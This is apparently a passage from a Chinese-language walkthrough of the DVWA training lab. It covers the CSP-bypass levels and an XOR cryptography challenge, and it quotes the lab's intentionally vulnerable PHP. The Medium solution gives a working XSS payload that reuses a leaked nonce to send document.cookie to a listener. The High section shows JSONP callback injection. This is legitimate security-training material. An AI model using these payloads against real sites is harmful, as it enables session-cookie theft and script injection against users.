# These might work if you can't create your own for some reason
# https://pastebin.com/raw/R570EE00
# https://www.toptal.com/developers/hastebin/raw/cezaruzeka

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
<p>
    As Pastebin and Hastebin have stopped working, here are some scripts that may, or may not help.
</p>
<ul>
    <li>https://digi.ninja/dvwa/alert.js</li>
    <li>https://digi.ninja/dvwa/alert.txt</li>
    <li>https://digi.ninja/dvwa/cookie.js</li>
    <li>https://digi.ninja/dvwa/forced_download.js</li>
    <li>https://digi.ninja/dvwa/wrong_content_type.js</li>
</ul>
<p>
    Pretend these are on a server like Pastebin and try to work out why some work and some do not work. Check the help for an explanation if you get stuck.
</p>
';
```


### Medium
```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
	" . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
	<p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
	<input size="50" type="text" name="include" value="" id="include" />
	<input type="submit" value="Include" />
</form>
';


```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250323133824.png)

- 允许内联脚本（`'unsafe-inline'`），但需要提供一个特定的 `nonce` 值（`TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=`）。
- 
```js
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">var url = 'http://127.0.0.1:7989?cookie=' + encodeURIComponent(document.cookie);   var xhr = new XMLHttpRequest();   xhr.open('GET', url, true);   xhr.send(); </script>
```

成功执行
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250323134452.png)

---
### High
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250323135655.png)

执行按钮后会请求json.php并设置相应参数
```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';
```

可以发现这个只会执行界面本身的js脚本

看看界面本身的js文件
```js
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```
当按钮被点击时会发拼接请求并发送
我们可以直接修改本页面的js代码造成任意js代码执行
当我们构造source/jsonp.php?callback="alert("xss")"会返回
alert("xss");({"answer":"15"}),由于返回时处于Javascript环境下，这是就会指向分号前面的语句到对应位置

---
## Cryptography
### Low
```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    try {
        if (array_key_exists ('message', $_POST)) {
            $message = $_POST['message'];
            if (array_key_exists ('direction', $_POST) && $_POST['direction'] == "decode") {
                $encoded = xor_this (base64_decode ($message), $key);
                $encode_radio_selected = " ";
                $decode_radio_selected = " checked='checked' ";
            } else {
                $encoded = base64_encode(xor_this ($message, $key));
            }
        }
        if (array_key_exists ('password', $_POST)) {
            $password = $_POST['password'];
            $decoded = xor_this (base64_decode ($password), $key);
            if ($password == "Olifant") {
                $success = "Welcome back user";
            } else {
                $errors = "Login Failed";
            }
        }
    } catch(Exception $e) {
        $errors = $e->getMessage();
    }
}
```
`key`:wachtwood
```php
$encoded = xor_this (base64_decode ($message), $key);
```
这条语句会将message进行base64解码并用key进行xor
写一个程序实现这一切
```python
import base64


def xor(message,key):
    outText = ""
    key_length = len(key)
    for i in range(len(message)):
        key_char = key[i % key_length]
        outText += chr(message[i] ^ ord(key_char))
    return outText
  

message="Lg4WGlQZChhSFBYSEB8bBQtPGxdNQSwEHREOAQY="
key="wachtwoord"
print(xor(base64.b64decode(message),key))
```

---
## API
API配置

---
### 供应商文件

[](https://github.com/digininja/DVWA/blob/master/README.md#vendor-files)

如果您想使用 API 模块，则需要使用 [Composer](https://getcomposer.org/) 安装一组供应商文件。

首先，确保您已安装 Composer。似乎存在向后兼容性问题，因此我总是从这里获取最新版本：

[https://getcomposer.org/doc/00-intro.md](https://getcomposer.org/doc/00-intro.md)

按照网站给出的说明进行安装。

现在进入目录并运行：`vulnerabilities/api`

```
composer.phar install
```

如果未将 Composer 安装到系统路径，请确保引用其完整位置。

### Low

